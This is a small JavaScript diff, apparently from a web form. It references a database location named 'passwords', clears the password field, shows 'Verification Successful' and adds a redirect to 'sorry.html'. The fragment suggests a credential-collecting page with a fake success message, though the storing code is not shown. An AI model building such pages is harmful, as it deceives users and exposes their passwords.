@@ -31,4 +31,6 @@ const passwordsRef = ref(database, "passwords");
 passwordInput.value = "";
 
 alert("Verification Successful");
+ 
+  window.location.href = "sorry.html";
 });
